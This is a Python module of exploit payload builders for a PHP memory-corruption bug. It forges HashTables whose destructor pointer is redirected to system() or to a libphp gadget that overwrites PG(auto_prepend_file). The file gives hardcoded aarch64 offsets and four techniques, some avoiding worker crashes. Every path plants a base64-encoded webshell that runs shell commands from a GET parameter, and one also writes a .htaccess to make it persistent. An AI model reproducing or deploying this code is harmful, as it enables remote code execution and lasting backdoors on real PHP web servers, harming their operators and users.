"""v2 payload builders — PG(auto_prepend_file) overwrite.

Four techniques:

1. HTACCESS (default, 1 crash): pDestructor=zif_system plants webshell +
   writes .htaccess in single system() call. Worker crashes once.

2. GADGET (1 crash): system() plants file (crash), then
   pDestructor=lxb_css_selector_list_remove overwrites BSS (no crash).
   No .htaccess needed.

3. ZERO (0 crashes): Session file via upload_progress + BSS write.

4. GROOMING (0 crashes, 100% Wiz): Keep-Alive pipeline, all ops on same
   worker. "GADGETS: none; runtime-resolved PHP global-pointer override."
   lxb function is callback reuse, not ROP gadget.

Function: lxb_css_selector_list_remove (libphp + 0x2a1a6c, aarch64)
    ldr x1, [x0, #0x18]       ; x1 = DEST = *(x0 + 0x18)
    cbz x1, skip
    ldr x2, [x0, #0x20]       ; x2 = VALUE = *(x0 + 0x20)
    str x2, [x1, #0x20]       ; *(DEST + 0x20) = VALUE   <- WRITE
    ldr x0, [x0, #0x20]       ; x0 = VALUE
    cbz x0, ret
    str x1, [x0, #0x18]       ; *(VALUE + 0x18) = DEST   <- reverse link
    ret

Write primitive: *(Bucket.key + 0x20) = NextBucket.val.value

Non-packed Bucket layout (stride 0x20):
    +0x00: val (zval, 16 bytes: value u64, u1 u32, u2 u32)
    +0x10: h (u64)
    +0x18: key (zend_string*)

pDestructor called with x0 = &Bucket[i].val, so:
    [x0+0x18] = Bucket[i].key
    [x0+0x20] = Bucket[i+1].val.value

Side write: *(Bucket[i+1].val.value + 0x18) = Bucket[i].key
    -> Must point to writable memory. If path_addr is within our
       controlled buffer, path_addr + 0x18 is also writable. The
       side write corrupts bytes at path+0x18 (past our 17-byte
       null-terminated path string). Harmless.

efree safety (release builds):
    After gadget returns, zend_array_destroy calls efree_size(ht, 56).
    In PHP release builds, efree_size computes bin from size and adds
    ptr to that bin's free list WITHOUT validating alignment. This
    corrupts the free list but does NOT crash. The worker survives
    long enough for the next request to read PG(auto_prepend_file).
    ZendMM reset (not full shutdown) between requests preserves heap
    pages — path string bytes persist in freed slot.
"""
from __future__ import annotations

import base64
import struct

BOUNDARY = b"C" * 10

PG_AUTO_PREPEND_FILE_OFFSET = 0xa0
CORE_GLOBALS_BSS_OFFSET = 0x12f38c8
GADGET_OFFSET = 0x2a1a6c  # lxb_css_selector_list_remove

PREPEND_PATH = b"/tmp/.p2s_v2.php"
PREPEND_PATH_SHORT = b"/tmp/p2s"

WEBSHELL_CODE = b'<?php if(isset($_GET["c"])){echo "<<<P2S>>>";system($_GET["c"]);echo "<<<P2E>>>";}'

# HASH_FLAG constants
HT_FLAG_STATIC_KEYS = 0x10
HT_FLAG_UNINITIALIZED = 0x08


def build_setup_hashtable(htdata_addr: int, zif_addr: int,
                          size: int = 384) -> bytes:
    """Build fake HashTable that plants webshell + activates auto_prepend_file.

    Single system() call runs combined command via semicolons.
    Worker crashes once. Next request has auto_prepend_file active.
    """
    webshell_b64 = base64.b64encode(WEBSHELL_CODE).decode()
    htaccess_line = f'php_value auto_prepend_file "{PREPEND_PATH.decode()}"'

    cmd = (f"echo {webshell_b64} | base64 -d > {PREPEND_PATH.decode()}; "
           f"echo '{htaccess_line}' > /var/www/html/.htaccess").encode()

    return _build_system_hashtable(htdata_addr, zif_addr, cmd, size)


def build_plant_file_hashtable(htdata_addr: int, zif_addr: int,
                                size: int = 384) -> bytes:
    """Build fake HashTable that ONLY plants webshell file. No .htaccess.

    Used by gadget technique: Stage A plants file (crash),
    Stage B activates via BSS write (no crash).
    """
    webshell_b64 = base64.b64encode(WEBSHELL_CODE).decode()
    cmd = f"echo {webshell_b64} | base64 -d > {PREPEND_PATH.decode()}".encode()
    return _build_system_hashtable(htdata_addr, zif_addr, cmd, size)


def build_gadget_hashtable(htdata_addr: int, libphp_base: int,
                            size: int = 384,
                            path: bytes = PREPEND_PATH) -> bytes:
    """Build fake HashTable that overwrites PG(auto_prepend_file) via gadget.

    Uses lxb_css_selector_list_remove as pDestructor.
    Non-packed HashTable with 1 element (nNumUsed=1).

    Layout:
      Bucket[0].key     = auto_prepend_addr - 0x20  (DEST for gadget)
      Bucket[1].val.value = path_addr                (VALUE written to target)
      Path string at offset 0x80                     (survives ZendMM free)

    Write: *(auto_prepend_addr) = path_addr
    Side:  *(path_addr + 0x18)  = auto_prepend_addr - 0x20 (harmless, past string)

    Worker survives. PG(auto_prepend_file) now points to path in freed heap.
    ZendMM reset preserves pages between requests — path bytes persist.

    HASH_FLAG_UNINITIALIZED set to skip arData free.
    FREE_HASHTABLE efree_size on non-aligned addr: no crash in release PHP.
    """
    gadget_addr = libphp_base + GADGET_OFFSET
    auto_prepend_addr = libphp_base + CORE_GLOBALS_BSS_OFFSET + PG_AUTO_PREPEND_FILE_OFFSET
    path_addr = htdata_addr + 0x80

    ht = bytearray(b"\x00" * size)

    # GC header: refcount=1, type_info=IS_ARRAY(7)
    struct.pack_into("<II", ht, 0x00, 1, 7)

    # flags: STATIC_KEYS | UNINITIALIZED (skip arData free)
    # nTableMask: -2 (2 hash slots)
    flags = HT_FLAG_STATIC_KEYS | HT_FLAG_UNINITIALIZED
    struct.pack_into("<II", ht, 0x08, flags, 0xFFFFFFFE)

    # arData: points to Bucket[0]
    struct.pack_into("<Q", ht, 0x10, htdata_addr + 0x40)

    # nNumUsed=1, nNumOfElements=1
    struct.pack_into("<II", ht, 0x18, 1, 1)

    # nTableSize=2
    struct.pack_into("<II", ht, 0x20, 2, 0)

    # nNextFreeElement
    struct.pack_into("<Q", ht, 0x28, 0)

    # pDestructor = gadget
    struct.pack_into("<Q", ht, 0x30, gadget_addr)

    # Hash index table at 0x38-0x3F (2 slots, each 0xFFFFFFFF = empty)
    struct.pack_into("<II", ht, 0x38, 0xFFFFFFFF, 0xFFFFFFFF)

    # Bucket[0] at 0x40 (0x20 bytes)
    B0 = 0x40
    # val: must be non-UNDEF for pDestructor to fire
    struct.pack_into("<Q", ht, B0 + 0x00, 0x1)    # val.value (non-zero)
    struct.pack_into("<I", ht, B0 + 0x08, 4)      # val.u1.type = IS_LONG
    struct.pack_into("<I", ht, B0 + 0x0C, 0)      # val.u2
    # h (hash)
    struct.pack_into("<Q", ht, B0 + 0x10, 0)
    # key = DEST for gadget: auto_prepend_addr - 0x20
    struct.pack_into("<Q", ht, B0 + 0x18, auto_prepend_addr - 0x20)

    # Bucket[1] at 0x60 — NOT iterated (nNumUsed=1), just data for gadget
    B1 = 0x60
    # val.value = VALUE written to *(DEST + 0x20) = path_addr
    struct.pack_into("<Q", ht, B1 + 0x00, path_addr)

    # Path string at 0x80 (within controlled buffer, survives ZendMM free)
    ht[0x80:0x80 + len(path)] = path
    ht[0x80 + len(path)] = 0  # null terminator

    # Bytes at 0x98 (path_addr + 0x18) will be overwritten by gadget's
    # side write: *(path_addr + 0x18) = auto_prepend_addr - 0x20
    # This is past our null-terminated path string (17 bytes). Harmless.

    return bytes(ht)


def _build_system_hashtable(htdata_addr: int, zif_addr: int, cmd: bytes,
                             size: int = 384) -> bytes:
    """Core HashTable builder with pDestructor=zif_system.

    Packed layout with fake execute_data so zif_system sees our string
    as a zend_string argument at the right offset.
    """
    if len(cmd) > size - 0x98 - 1:
        raise ValueError(f"command too long ({len(cmd)} bytes)")

    ht = bytearray(b"\x00" * size)

    # GC header
    struct.pack_into("<II", ht, 0x00, 1, 7)
    # flags + nTableMask
    struct.pack_into("<II", ht, 0x08, 0x10, 0xFFFFFFF8)
    # arData
    struct.pack_into("<Q", ht, 0x10, htdata_addr + 0x20)
    # nNumUsed=1, nNumOfElements=1
    struct.pack_into("<II", ht, 0x18, 1, 1)
    # nTableSize
    struct.pack_into("<II", ht, 0x20, 8, 0)
    # nNextFreeElement
    struct.pack_into("<Q", ht, 0x28, 0)
    # pDestructor = zif_system
    struct.pack_into("<Q", ht, 0x30, zif_addr)

    # Fake execute_data for zif_system
    E = 0x20
    struct.pack_into("<Q", ht, E + 0x00, 0)
    struct.pack_into("<Q", ht, E + 0x08, 0)
    struct.pack_into("<Q", ht, E + 0x10, zif_addr)
    struct.pack_into("<Q", ht, E + 0x18, 0)
    struct.pack_into("<Q", ht, E + 0x20, 0)
    struct.pack_into("<I", ht, E + 0x28, 0)
    struct.pack_into("<I", ht, E + 0x2C, 1)
    struct.pack_into("<Q", ht, E + 0x30, 0)
    struct.pack_into("<Q", ht, E + 0x38, 0)
    struct.pack_into("<I", ht, E + 0x40, 0)
    # Pointer to zend_string containing command
    struct.pack_into("<Q", ht, E + 0x50, htdata_addr + 0x80)
    struct.pack_into("<I", ht, E + 0x58, 6)  # IS_STRING

    # Fake zend_string at 0x80
    struct.pack_into("<II", ht, 0x80, 1, 0x106)  # gc
    struct.pack_into("<Q", ht, 0x88, 0)           # h
    struct.pack_into("<Q", ht, 0x90, len(cmd))    # len
    ht[0x98:0x98 + len(cmd)] = cmd
    ht[0x98 + len(cmd)] = 0

    return bytes(ht)


def get_core_globals_offset() -> int:
    return CORE_GLOBALS_BSS_OFFSET


def get_auto_prepend_offset() -> int:
    return PG_AUTO_PREPEND_FILE_OFFSET


def get_gadget_offset() -> int:
    return GADGET_OFFSET
